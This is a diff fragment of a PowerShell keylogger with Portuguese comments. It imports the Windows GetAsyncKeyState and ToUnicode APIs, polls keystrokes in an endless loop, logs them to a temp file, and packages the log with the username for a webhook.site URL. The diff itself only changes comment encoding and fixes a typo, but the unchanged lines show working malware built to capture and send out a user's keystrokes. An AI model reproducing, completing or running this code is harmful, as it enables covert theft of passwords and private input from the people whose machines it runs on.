@@ -8,10 +8,10 @@ $webhook = "https://webhook.site/Seu-ID"
 # Escreve um PID
 $PID > "$env:temp/DdBPKCytRe"
 
-# Função do Keylogger
+# FunÃ§Ã£o do Keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
-  # Formata a requisição que será enviada para o webhook
+  # Formata a requisiÃ§Ã£o que serÃ¡ enviada para o webhook
   $logs = Get-Content "$logFile" | Out-String
   $Body = @{
     'username' = $env:UserName
@@ -22,7 +22,7 @@ function KeyLogger($logFile="$env:temp/$env:UserName.log") {
   # Gera um aquivo de log 
   $generateLog = New-Item -Path $logFile -ItemType File -Force
 
-  # Comunicações com as API's
+  # ComunicaÃ§Ãµes com as API's
   $APIsignatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
 public static extern short GetAsyncKeyState(int virtualKeyCode);
@@ -37,7 +37,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
  # Configura as API's
  $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
 
-  # Tenta capturar as teclas pressionada
+  # Tenta capturar as teclas pressionadas
   try {
     while ($true) {
       Start-Sleep -Milliseconds 40
